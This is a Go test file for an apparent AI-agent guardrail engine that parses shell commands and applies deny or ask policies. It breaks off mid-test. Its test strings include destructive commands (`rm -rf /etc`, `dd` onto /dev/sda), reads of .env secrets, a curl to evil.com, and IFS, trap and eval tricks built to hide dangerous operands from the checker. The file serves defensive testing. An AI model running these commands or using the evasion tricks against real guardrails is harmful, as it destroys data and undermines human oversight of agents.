package engine

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"

	"github.com/CtrlCarlitos/agent-guardrails/internal/policy"
)

func argvs(ss []Simple) [][]string {
	out := make([][]string, len(ss))
	for i, s := range ss {
		out[i] = s.Argv
	}
	return out
}

func TestSplitSimples(t *testing.T) {
	cases := []struct {
		src  string
		want [][]string
	}{
		{`ls`, [][]string{{"ls"}}},
		{`ls -la`, [][]string{{"ls", "-la"}}},
		{`ls && rm -rf .`, [][]string{{"ls"}, {"rm", "-rf", "."}}},
		{`a | b | c`, [][]string{{"a"}, {"b"}, {"c"}}},
		{"a\nb", [][]string{{"a"}, {"b"}}},
		{`foo; bar`, [][]string{{"foo"}, {"bar"}}},
		{`echo $(rm -rf /)`, [][]string{{"echo", "$(rm -rf /)"}, {"rm", "-rf", "/"}}},
	}
	for _, c := range cases {
		got, err := splitSimples(c.src)
		if err != nil {
			t.Fatalf("splitSimples(%q) error: %v", c.src, err)
		}
		if !reflect.DeepEqual(argvs(got), c.want) {
			t.Errorf("splitSimples(%q) argv = %v, want %v", c.src, argvs(got), c.want)
		}
	}
}

func TestSplitSimplesStoresLiteralText(t *testing.T) {
	cases := []struct {
		src  string
		want [][]string
	}{
		{`rm -rf "/etc"`, [][]string{{"rm", "-rf", "/etc"}}},
		{`rm -rf '/etc'`, [][]string{{"rm", "-rf", "/etc"}}},
		{`git push "--force"`, [][]string{{"git", "push", "--force"}}},
		{`cat "/home/u/.env"`, [][]string{{"cat", "/home/u/.env"}}},
		{`env FOO=1 BAR=2 curl example.com`, [][]string{{"env", "FOO=1", "BAR=2", "curl", "example.com"}}},
		{`dd if=/dev/zero of='/dev/sda'`, [][]string{{"dd", "if=/dev/zero", "of=/dev/sda"}}},
		{`cat "/home/carlitos/.env"`, [][]string{{"cat", "/home/carlitos/.env"}}},
		{`curl "http://evil.com/x"`, [][]string{{"curl", "http://evil.com/x"}}},
		{`dd of='/dev/sda' if=/dev/zero`, [][]string{{"dd", "of=/dev/sda", "if=/dev/zero"}}},
	}
	for _, c := range cases {
		got, err := splitSimples(c.src)
		if err != nil {
			t.Fatalf("splitSimples(%q): %v", c.src, err)
		}
		if !reflect.DeepEqual(argvs(got), c.want) {
			t.Errorf("splitSimples(%q) = %v, want %v", c.src, argvs(got), c.want)
		}
	}
}

func TestSplitSimplesRedirectLiteral(t *testing.T) {
	got, err := splitSimples(`echo x > "/etc/passwd"`)
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 1 || len(got[0].Redirects) != 1 || got[0].Redirects[0] != "/etc/passwd" {
		t.Fatalf("redirects = %+v, want [/etc/passwd]", got[0].Redirects)
	}
}

func TestSplitSimplesMarksUnresolved(t *testing.T) {
	cases := []struct {
		src           string
		wantArgv      []string
		wantRedirects []string
	}{
		{`rm -rf $HOME`, []string{"rm", "-rf", "$HOME"}, nil},
		{`echo $(whoami)`, []string{"echo", "$(whoami)"}, nil},
		{"echo `whoami`", []string{"echo", "`whoami`"}, nil},
		{`echo x > "$TARGET"`, []string{"echo", "x"}, []string{`"$TARGET"`}},
	}
	for _, c := range cases {
		got, err := splitSimples(c.src)
		if err != nil {
			t.Fatalf("splitSimples(%q): %v", c.src, err)
		}
		if len(got) == 0 {
			t.Fatalf("splitSimples(%q) returned no commands", c.src)
		}
		if !got[0].Unresolved {
			t.Errorf("splitSimples(%q) did not mark the command unresolved: %+v", c.src, got[0])
		}
		if !reflect.DeepEqual(got[0].Argv, c.wantArgv) {
			t.Errorf("splitSimples(%q) argv = %v, want raw spelling %v", c.src, got[0].Argv, c.wantArgv)
		}
		if !reflect.DeepEqual(got[0].Redirects, c.wantRedirects) {
			t.Errorf("splitSimples(%q) redirects = %v, want raw spelling %v", c.src, got[0].Redirects, c.wantRedirects)
		}
	}

	clean, err := splitSimples(`rm -rf /etc`)
	if err != nil {
		t.Fatal(err)
	}
	if len(clean) != 1 {
		t.Fatalf("splitSimples clean command count = %d, want 1", len(clean))
	}
	if clean[0].Unresolved {
		t.Error("a fully literal command must not be marked Unresolved")
	}
}

func TestNormalizeResolvesQuotedPriorScalarLiteralAssignments(t *testing.T) {
	got, err := Normalize(`SDK="/abs/lit"; grep -rn Foo "$SDK/api/"`, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 1 {
		t.Fatalf("Normalize returned %+v, want one command", got)
	}
	want := []string{"grep", "-rn", "Foo", "/abs/lit/api/"}
	if !reflect.DeepEqual(got[0].Argv, want) || got[0].Unresolved {
		t.Fatalf("Normalize argv = %v unresolved=%v, want locally resolved %v", got[0].Argv, got[0].Unresolved, want)
	}
}

// Mutation caught: rejecting every top-level ParamExp leaves safe embedded parameters unresolved and triggers P3.
func TestNF5bResolvesPlainParametersEmbeddedInUnquotedWords(t *testing.T) {
	tmp := t.TempDir()
	if err := os.MkdirAll(filepath.Join(tmp, "tlp"), 0o700); err != nil {
		t.Fatal(err)
	}
	for _, script := range []string{filepath.Join(tmp, "run.sh"), filepath.Join(tmp, "tlp", "x")} {
		if err := os.WriteFile(script, []byte(":\n"), 0o700); err != nil {
			t.Fatal(err)
		}
	}

	for _, test := range []struct {
		command string
		want    string
	}{
		{fmt.Sprintf(`S=%q; bash $S/run.sh`, tmp), filepath.Join(tmp, "run.sh")},
		{fmt.Sprintf(`SP=%q; bash $SP/tlp/x`, tmp), filepath.Join(tmp, "tlp", "x")},
		{fmt.Sprintf(`S=%q; bash ${S}/run.sh`, tmp), filepath.Join(tmp, "run.sh")},
	} {
		got, err := Normalize(test.command, "/repo")
		if err != nil {
			t.Fatalf("Normalize(%q): %v", test.command, err)
		}
		last := got[len(got)-1]
		wantArgv := []string{"bash", test.want}
		if !reflect.DeepEqual(last.Argv, wantArgv) || last.Unresolved || !last.resolvedArgs[1] || last.wordUnresolved(1) {
			t.Errorf("Normalize(%q) last = %+v, want resolved argv %q with concrete provenance", test.command, last, wantArgv)
		}
		if verdict := checkBash(ToolCall{Tool: "Bash", Command: test.command, CWD: "/repo", RepoRoot: "/repo"}, bashPol()); verdict != nil {
			t.Errorf("checkBash(%q) = %+v, want allow", test.command, verdict)
		}
	}
}

// Mutation caught: resolving an embedded parameter without preserving provenance makes the concrete /etc target evade P1 or trip P3.
func TestNF5bResolvedEmbeddedParameterReachesRmPolicy(t *testing.T) {
	command := `S=/etc; rm -rf $S/x`
	got, err := Normalize(command, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	last := got[len(got)-1]
	if want := []string{"rm", "-rf", "/etc/x"}; !reflect.DeepEqual(last.Argv, want) || last.Unresolved || !last.resolvedArgs[2] || last.wordUnresolved(2) {
		t.Fatalf("Normalize(%q) last = %+v, want resolved argv %q with concrete provenance", command, last, want)
	}
	verdict := evalBash(t, command)
	if verdict == nil || verdict.Decision != policy.Deny || verdict.RuleID != "P1.rm-rf" {
		t.Fatalf("checkBash(%q) = %+v, want deny/P1.rm-rf", command, verdict)
	}
}

// Mutation caught: accepting unknown, operated, indexed, indirect, name, or special parameters converts runtime-dependent words into literals.
func TestNF5bLeavesNonPlainParametersUnresolved(t *testing.T) {
	for _, command := range []string{
		`bash $UNKNOWN/run.sh`,
		`S=/tmp; bash ${S:-/var}/run.sh`,
		`S=/tmp; bash ${S:0:2}/run.sh`,
		`S=/tmp; bash ${S/tmp/var}/run.sh`,
		`S=/tmp; bash ${!S}/run.sh`,
		`S=/tmp; bash ${!S*}/run.sh`,
		`S=/tmp; bash ${S[0]}/run.sh`,
		`bash $?/run.sh`,
	} {
		got, err := Normalize(command, "/repo")
		if err != nil {
			t.Fatalf("Normalize(%q): %v", command, err)
		}
		last := got[len(got)-1]
		if !last.Unresolved || !last.wordUnresolved(1) {
			t.Errorf("Normalize(%q) last = %+v, want unresolved script word", command, last)
		}
		verdict := evalBash(t, command)
		if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
			t.Errorf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
		}
	}
}

// Mutation caught: multiple empty unquoted expansions can remove the apparent command word and shift a destructive command into its place.
func TestNF5bLeavesZeroFieldCommandWordsUnresolved(t *testing.T) {
	command := `A=; B=; $A$B rm -rf /etc`
	got, err := Normalize(command, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	last := got[len(got)-1]
	if !last.Unresolved || !last.wordUnresolved(0) {
		t.Fatalf("Normalize(%q) last = %+v, want command word unresolved", command, last)
	}
	verdict := evalBash(t, command)
	if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
		t.Fatalf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
	}
}

// Mutation caught: resolving split- or glob-bearing values unquoted collapses a runtime field set into one synthetic argument.
func TestNF5bLeavesUnsafeUnquotedParameterValuesUnresolved(t *testing.T) {
	for _, value := range []string{"/tmp/with space", "/tmp/*"} {
		command := fmt.Sprintf(`S=%q; bash $S/run.sh`, value)
		got, err := Normalize(command, "/repo")
		if err != nil {
			t.Fatalf("Normalize(%q): %v", command, err)
		}
		last := got[len(got)-1]
		if !last.Unresolved || !last.wordUnresolved(1) {
			t.Errorf("Normalize(%q) last = %+v, want unsafe unquoted script word unresolved", command, last)
		}
		verdict := evalBash(t, command)
		if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
			t.Errorf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
		}
	}
}

// Mutation caught: checking only default IFS whitespace resolves a value that a tracked custom IFS splits into multiple fields.
func TestNF5bHonorsTrackedIFSWhenResolvingUnquotedParameters(t *testing.T) {
	command := `IFS=/; S=tmp/scripts; bash $S/run.sh`
	got, err := Normalize(command, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	last := got[len(got)-1]
	if !last.Unresolved || !last.wordUnresolved(1) {
		t.Fatalf("Normalize(%q) last = %+v, want custom-IFS script word unresolved", command, last)
	}
	verdict := evalBash(t, command)
	if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
		t.Fatalf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
	}
}

// Mutation caught: falling back to default IFS after targeted mutation can collapse runtime fields into one safe-looking path.
func TestNF5bLeavesWordsUnresolvedAfterUnknownIFSMutation(t *testing.T) {
	command := `S=/tmp/scripts; read IFS <<< /; bash $S/run.sh`
	got, err := Normalize(command, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	last := got[len(got)-1]
	if !last.Unresolved || !last.wordUnresolved(1) {
		t.Fatalf("Normalize(%q) last = %+v, want unknown-IFS script word unresolved", command, last)
	}
	verdict := evalBash(t, command)
	if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
		t.Fatalf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
	}
}

// Mutation caught: parameter and arithmetic expansions can mutate IFS before a later unquoted prefix expands.
func TestNF5bInvalidatesIFSAfterExpansionSideEffects(t *testing.T) {
	for _, command := range []string{
		`IFS=; S='--one-file-systemX/etc'; : ${IFS:=X}; rm -rf $S/x`,
		`IFS=; S='--one-file-system8/etc'; : $((IFS=8)); rm -rf $S/x`,
	} {
		verdict := evalBash(t, command)
		if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
			t.Errorf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
		}
	}
}

// Mutation caught: invalidating only IFS leaves the assigned parameter's stale literal available to later policy checks.
func TestNF5bInvalidatesVariablesAssignedByExpansion(t *testing.T) {
	command := `S=; : ${S:=/../../etc}; bash /repo$S/x`
	got, err := Normalize(command, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	last := got[len(got)-1]
	if !last.Unresolved || !last.wordUnresolved(1) {
		t.Fatalf("Normalize(%q) last = %+v, want assigned parameter unresolved", command, last)
	}
	verdict := evalBash(t, command)
	if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
		t.Fatalf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
	}
}

// Mutation caught: arithmetic recursively evaluates variable contents that may assign IFS.
func TestNF5bInvalidatesVariablesForRecursiveArithmeticEvaluation(t *testing.T) {
	command := `IFS=; X='IFS=8'; S='--one-file-system8/etc'; : $((X)); rm -rf $S/x`
	verdict := evalBash(t, command)
	if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
		t.Fatalf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
	}
}

// Mutation caught: temporary command-prefix IFS assignments leaking past builtins can hide split deletion operands.
func TestNF5bRestoresPrefixIFSAfterShellBuiltins(t *testing.T) {
	for _, command := range []string{
		`IFS= cd .; S='--one-file-system /etc'; rm -rf $S/x`,
		`IFS= eval ':'; S='--one-file-system /etc'; rm -rf $S/x`,
		`IFS= source /dev/null; S='--one-file-system /etc'; rm -rf $S/x`,
	} {
		verdict := evalBash(t, command)
		if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
			t.Errorf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
		}
	}
}

func TestNF5bStopsAtExternalShellTransitions(t *testing.T) {
	for _, command := range []string{
		`S=/tmp/scripts; bash -c 'bash $S/run.sh'`,
		`S=/tmp/scripts bash -c 'bash $S/run.sh'`,
		`S=/tmp/scripts; watch 'bash $S/run.sh'`,
	} {
		verdict := evalBash(t, command)
		if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
			t.Errorf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
		}
	}

	command := `bash -c 'rm -rf /'`
	verdict := evalBash(t, command)
	if verdict == nil || verdict.Decision != policy.Deny || verdict.RuleID != "P1.rm-rf" {
		t.Fatalf("checkBash(%q) = %+v, want deny/P1.rm-rf", command, verdict)
	}
}

func TestNF5bInvalidatesAmbiguousShellSemantics(t *testing.T) {
	for _, command := range []string{
		`S=/tmp/scripts; set -o posix; bash $S/run.sh`,
		`S=/tmp/scripts; IFS=X builtin command eval ':'; bash $S/run.sh`,
		`S=/tmp/scripts; IFS=X command builtin eval ':'; bash $S/run.sh`,
	} {
		verdict := evalBash(t, command)
		if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
			t.Errorf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
		}
	}
}

func TestNF5bKeepsFactsInvalidAfterPersistentMutation(t *testing.T) {
	for _, command := range []string{
		`S=/tmp; trap 'S=/etc' DEBUG; S=/tmp; rm -rf "$S/x"`,
		`S=/tmp; shopt -s lastpipe; S=/tmp; printf /etc | read S; rm -rf "$S/x"`,
	} {
		verdict := evalBash(t, command)
		if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
			t.Errorf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
		}
	}

	command := `bash -c 'S=/etc; rm -rf "$S/x"'`
	verdict := evalBash(t, command)
	if verdict == nil || verdict.Decision != policy.Deny || verdict.RuleID != "P1.rm-rf" {
		t.Fatalf("checkBash(%q) = %+v, want deny/P1.rm-rf", command, verdict)
	}
}

func TestNF5bTracksExpansionSideEffectsInDeclarations(t *testing.T) {
	for _, declaration := range []string{"export", "readonly", "declare"} {
		command := fmt.Sprintf(`IFS=; %s Z=${IFS:=X}; S='--one-file-systemX/etc'; rm -rf $S/x`, declaration)
		verdict := evalBash(t, command)
		if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
			t.Errorf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
		}
	}
}

func TestNF5bTracksRecursiveArithmeticInIndicesAndSlices(t *testing.T) {
	for _, command := range []string{
		`IFS=; N='IFS=Z'; a=(x); : "${a[N]}"; S='--one-file-systemZ/etc'; rm -rf $S/x`,
		`IFS=; N='IFS=Z'; A=abcdef; : "${A:N:1}"; S='--one-file-systemZ/etc'; rm -rf $S/x`,
		`IFS=; N='IFS=Z'; a[N]=x; S='--one-file-systemZ/etc'; rm -rf $S/x`,
	} {
		verdict := evalBash(t, command)
		if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
			t.Errorf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
		}
	}
}

func TestNF5bTracksRecursiveArithmeticInArrayInitializers(t *testing.T) {
	command := `IFS=; N='IFS=Z'; a=([N]=x); S='--one-file-systemZ/etc'; rm -rf $S/x`
	verdict := evalBash(t, command)
	if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
		t.Fatalf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
	}
}

func TestNF5bTracksRecursiveArithmeticInIndirectExpansions(t *testing.T) {
	command := `IFS=; N='IFS=Z'; ref='a[N]'; a=(x); : "${!ref}"; S='--one-file-systemZ/etc'; rm -rf $S/x`
	got, err := Normalize(command, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	last := got[len(got)-1]
	if !last.Unresolved || !last.wordUnresolved(2) {
		t.Fatalf("Normalize(%q) last = %+v, want deletion operand unresolved", command, last)
	}
}

func TestNF5bInvalidatesVariablesAfterReachableTrapInstallation(t *testing.T) {
	for _, command := range []string{
		`IFS=; trap 'IFS=X' DEBUG; S='--one-file-systemX/etc'; rm -rf $S/x`,
		`IFS=; trap 'IFS=X' RETURN; f(){ :; }; f; S='--one-file-systemX/etc'; rm -rf $S/x`,
		`IFS=; trap 'IFS=X' ERR; false; S='--one-file-systemX/etc'; rm -rf $S/x`,
	} {
		verdict := evalBash(t, command)
		if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
			t.Errorf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
		}
	}
}

func TestNF5bInvalidatesVariablesAfterUnresolvedEval(t *testing.T) {
	command := `S=/tmp/scripts; eval "$UNKNOWN"; bash $S/run.sh`
	got, err := Normalize(command, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	last := got[len(got)-1]
	if last.resolvedArgs[1] || !last.wordUnresolved(1) {
		t.Fatalf("Normalize(%q) last = %+v, want script word unresolved", command, last)
	}
}

// Mutation caught: restoring prefix variables but not IFS certainty after a function leaves unsafe splitting modeled as concrete.
func TestNF5bRestoresPrefixIFSAfterFunction(t *testing.T) {
	command := `f(){ :; }; IFS=/; IFS= f; S=tmp/scripts; bash $S/run.sh`
	verdict := evalBash(t, command)
	if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
		t.Fatalf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
	}
}

// Mutation caught: merging branches with different known IFS values as default permits unsafe concrete substitution.
func TestNF5bMergesDifferentIFSValuesAsUnknown(t *testing.T) {
	command := `if [ -e /runtime-choice ]; then IFS=/; else IFS=:; fi; S=tmp/scripts; bash $S/run.sh`
	got, err := Normalize(command, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	last := got[len(got)-1]
	if !last.Unresolved || !last.wordUnresolved(1) {
		t.Fatalf("Normalize(%q) last = %+v, want branch-merged IFS unresolved", command, last)
	}
}

// Mutation caught: checking only the parameter value misses glob syntax in another part of the assembled word.
func TestNF5bLeavesLiteralSuffixGlobsUnresolved(t *testing.T) {
	for _, command := range []string{
		`S=/tmp/scripts; bash $S/*.sh`,
		`S=/tmp/scripts; bash $S/@(out)`,
	} {
		verdict := evalBash(t, command)
		if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
			t.Errorf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
		}
	}
}

// Mutation caught: applying unquoted splitting/globbing restrictions inside double quotes rejects concrete one-field words.
func TestNF5bPreservesQuotedParameterSemantics(t *testing.T) {
	for _, value := range []string{"/tmp/with space", "/tmp/*"} {
		command := fmt.Sprintf(`S=%q; bash "$S/run.sh"`, value)
		got, err := Normalize(command, "/repo")
		if err != nil {
			t.Fatalf("Normalize(%q): %v", command, err)
		}
		last := got[len(got)-1]
		want := []string{"bash", value + "/run.sh"}
		if !reflect.DeepEqual(last.Argv, want) || last.Unresolved || !last.resolvedArgs[1] || last.wordUnresolved(1) {
			t.Errorf("Normalize(%q) last = %+v, want quoted resolved argv %q", command, last, want)
		}
		if verdict := evalBash(t, command); verdict != nil {
			t.Errorf("checkBash(%q) = %+v, want allow", command, verdict)
		}
	}
}

// Mutation caught: requiring a literal anchor for every unquoted parameter leaves safe standalone scalar fields unresolved.
func TestNF19ResolvesSafeStandaloneParameters(t *testing.T) {
	command := `PLAN=docs/x; SK=/repo/tools; $SK/review-package $PLAN`
	got, err := Normalize(command, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"/repo/tools/review-package", "docs/x"}
	if len(got) != 1 || !reflect.DeepEqual(got[0].Argv, want) || got[0].Unresolved || !got[0].resolvedArgs[0] || !got[0].resolvedArgs[1] {
		t.Fatalf("Normalize(%q) = %+v, want one concrete command %q", command, got, want)
	}
	if verdict := evalBash(t, `PLAN=docs/x; git add $PLAN`); verdict != nil {
		t.Fatalf("standalone assigned git operand = %+v, want allow", verdict)
	}
}

// Mutation caught: treating zero-, split-, or glob-producing standalone expansions as one field can hide the runtime command shape.
func TestNF19LeavesUnsafeStandaloneParametersUnresolved(t *testing.T) {
	for _, command := range []string{
		`S=; rm -rf $S`,
		`rm -rf $INHERITED`,
		`S='/repo/one two'; rm -rf $S`,
		`IFS=/; S=repo/path; rm -rf $S`,
		`S='/repo/*'; rm -rf $S`,
		`if condition; then S=/repo/a; else S=/repo/b; fi; rm -rf $S`,
		`S=/repo/a; rm -rf ${S:-/etc}`,
		`S=$(printf /repo/a); rm -rf $S`,
		`S=$((1)); rm -rf $S`,
	} {
		verdict := evalBash(t, command)
		if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
			t.Errorf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
		}
	}
}

// Mutation caught: combining adjacent unquoted expansions exceeds the approved one-part standalone resolution boundary.
func TestNF19LeavesAdjacentUnquotedParametersUnresolved(t *testing.T) {
	command := `A=/; B=etc; rm -rf $A$B`
	verdict := evalBash(t, command)
	if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
		t.Fatalf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
	}
}

// Mutation caught: walking a finite loop only once drops concrete iterator values from normalization and policy aggregation.
func TestNF19EnumeratesStaticFiniteLoopItemsInShellOrder(t *testing.T) {
	command := `for n in one two three; do /repo/bin/$n /repo/$n; done`
	got, err := Normalize(command, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	want := [][]string{
		{"/repo/bin/one", "/repo/one"},
		{"/repo/bin/two", "/repo/two"},
		{"/repo/bin/three", "/repo/three"},
	}
	if !reflect.DeepEqual(argvs(got), want) {
		t.Fatalf("Normalize(%q) argv = %v, want every iteration in shell order %v", command, argvs(got), want)
	}
	for index, simple := range got {
		if simple.Unresolved || !simple.resolvedArgs[0] || !simple.resolvedArgs[1] {
			t.Errorf("iteration %d lost concrete resolver provenance: %+v", index, simple)
		}
	}
	if verdict := evalBash(t, command); verdict != nil {
		t.Fatalf("checkBash(%q) = %+v, want allow for audited concrete candidates", command, verdict)
	}
}

// Mutation caught: discarding any enumerated item can keep its concrete destructive path from the strongest-Verdict aggregation.
func TestNF19EveryFiniteLoopItemReachesPolicy(t *testing.T) {
	command := `for TARGET in /repo/safe /etc; do rm -rf $TARGET; done`
	verdict := evalBash(t, command)
	if verdict == nil || verdict.Decision != policy.Deny || verdict.RuleID != "P1.rm-rf" {
		t.Fatalf("checkBash(%q) = %+v, want deny/P1.rm-rf from strongest loop iteration", command, verdict)
	}
}

// Mutation caught: recursively enumerating eligible loops multiplies candidates without bound.
func TestNF19NestedFiniteLoopsFailClosedWithoutProductExpansion(t *testing.T) {
	command := `for a in 1 2 3 4 5 6 7 8 9 10; do for b in 1 2 3 4 5 6 7 8 9 10; do for c in 1 2 3 4 5 6 7 8 9 10; do for d in 1 2 3 4 5 6 7 8 9 10; do for e in 1 2 3 4 5 6 7 8 9 10; do rm -rf "/repo/$a/$b/$c/$d/$e"; done; done; done; done; done`
	type result struct {
		simples []Simple
		verdict *policy.Verdict
		err     error
	}
	done := make(chan result, 1)
	go func() {
		simples, err := Normalize(command, "/repo")
		verdict := checkBash(ToolCall{Tool: "Bash", Command: command, CWD: "/repo", RepoRoot: "/repo"}, bashPol())
		done <- result{simples: simples, verdict: verdict, err: err}
	}()
	select {
	case got := <-done:
		if got.err != nil {
			t.Fatal(got.err)
		}
		if len(got.simples) != 1 || !got.simples[0].Unresolved {
			t.Fatalf("Normalize produced %d candidates (%+v), want one unresolved candidate", len(got.simples), got.simples)
		}
		if got.verdict == nil || got.verdict.Decision != policy.Ask || got.verdict.RuleID != "P3.unresolved" {
			t.Fatalf("checkBash = %+v, want ask/P3.unresolved", got.verdict)
		}
	case <-time.After(time.Second):
		t.Fatal("nested finite loops exceeded the one-second normalization deadline")
	}
}

// Mutation caught: moving the item cap above 16 reintroduces attacker-controlled candidate growth.
func TestNF19FiniteLoopItemLimit(t *testing.T) {
	tests := []struct {
		name       string
		items      string
		candidates int
		decision   policy.Decision
		ruleID     string
	}{
		{name: "sixteen enumerates", items: "01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16", candidates: 16, decision: policy.Allow},
		{name: "seventeen asks", items: "01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17", candidates: 1, decision: policy.Ask, ruleID: "P3.unresolved"},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			command := fmt.Sprintf(`for n in %s; do rm -rf "/repo/$n"; done`, test.items)
			simples, err := Normalize(command, "/repo")
			if err != nil {
				t.Fatal(err)
			}
			if len(simples) != test.candidates {
				t.Fatalf("Normalize produced %d candidates, want %d", len(simples), test.candidates)
			}
			verdict := checkBash(ToolCall{Tool: "Bash", Command: command, CWD: "/repo", RepoRoot: "/repo"}, bashPol())
			if test.decision == policy.Allow {
				if verdict != nil {
					t.Fatalf("checkBash = %+v, want allow", verdict)
				}
				return
			}
			if verdict == nil || verdict.Decision != test.decision || verdict.RuleID != test.ruleID {
				t.Fatalf("checkBash = %+v, want %s/%s", verdict, test.decision, test.ruleID)
			}
		})
	}
}

// Mutation caught: retaining the normalized value but losing its provenance hides the resolved path from P4.
func TestNF19ResolvedUnknownCommandOperandReachesPathPolicy(t *testing.T) {
	pol := pathPol()
	pol.Slots.SecretDirs = append(pol.Slots.SecretDirs, "/etc/passwd")
	tests := []struct {
		name     string
		command  string
		decision policy.Decision
		ruleID   string
	}{
		{name: "safe", command: `T=/tmp/gc/x; somenewtool $T`, decision: policy.Allow},
		{name: "etc", command: `T=/etc/passwd; somenewtool $T`, decision: policy.Deny, ruleID: "P4.secret-path"},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			verdict := Evaluate(ToolCall{Tool: "Bash", Command: test.command, CWD: "/repo", RepoRoot: "/repo"}, pol)
			if test.decision == policy.Allow {
				if verdict.Decision != policy.Allow {
					t.Fatalf("Evaluate = %+v, want allow", verdict)
				}
				return
			}
			if verdict.Decision != test.decision || verdict.RuleID != test.ruleID {
				t.Fatalf("Evaluate = %+v, want %s/%s", verdict, test.decision, test.ruleID)
			}
		})
	}
}

// Mutation caught: treating an unquoted brace expansion as one literal loop item omits its destructive runtime item.
func TestNF19BraceExpandedLoopListFailsClosed(t *testing.T) {
	command := `for n in {safe,/etc}; do rm -rf "$n"; done`
	verdict := evalBash(t, command)
	if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
		t.Fatalf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
	}
}

// Mutation caught: rejecting brace text without respecting shell quoting loses an eligible literal item.
func TestNF19QuotedBraceLoopItemRemainsConcrete(t *testing.T) {
	command := `for n in '{safe,/etc}'; do rm -rf "$n"; done`
	got, err := Normalize(command, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	want := [][]string{{"rm", "-rf", "{safe,/etc}"}}
	if !reflect.DeepEqual(argvs(got), want) || got[0].Unresolved {
		t.Fatalf("Normalize(%q) = %+v, want one concrete candidate %v", command, got, want)
	}
	if verdict := evalBash(t, command); verdict != nil {
		t.Fatalf("checkBash(%q) = %+v, want allow", command, verdict)
	}
}

// Mutation caught: parsing a function-shadowed wrapper before function lookup can erase its destructive body.
func TestNF19FunctionShadowedWrappersReachPolicy(t *testing.T) {
	for _, wrapper := range []string{"command", "builtin"} {
		for _, command := range []string{
			fmt.Sprintf(`%s(){ rm -rf /etc; }; %s`, wrapper, wrapper),
			fmt.Sprintf(`%s(){ rm -rf /etc; }; WRAPPER=%s; $WRAPPER`, wrapper, wrapper),
			fmt.Sprintf(`%s(){ rm -rf /etc; }; for n in one two; do %s; done`, wrapper, wrapper),
		} {
			verdict := evalBash(t, command)
			if verdict == nil || verdict.Decision != policy.Deny || verdict.RuleID != "P1.rm-rf" {
				t.Errorf("checkBash(%q) = %+v, want deny/P1.rm-rf", command, verdict)
			}
		}
	}
}

// Mutation caught: moving wrapper lookup must not stop real wrappers from bypassing a function with the wrapped name.
func TestNF19UnshadowedWrappersStillBypassFunctions(t *testing.T) {
	for _, wrapper := range []string{"command", "builtin"} {
		command := fmt.Sprintf(`danger(){ rm -rf /etc; }; %s danger`, wrapper)
		got, err := Normalize(command, "/repo")
		if err != nil {
			t.Fatal(err)
		}
		if hasArgv(got, []string{"rm", "-rf", "/etc"}) {
			t.Errorf("Normalize(%q) invoked bypassed function: %+v", command, got)
		}
		if verdict := evalBash(t, command); verdict != nil {
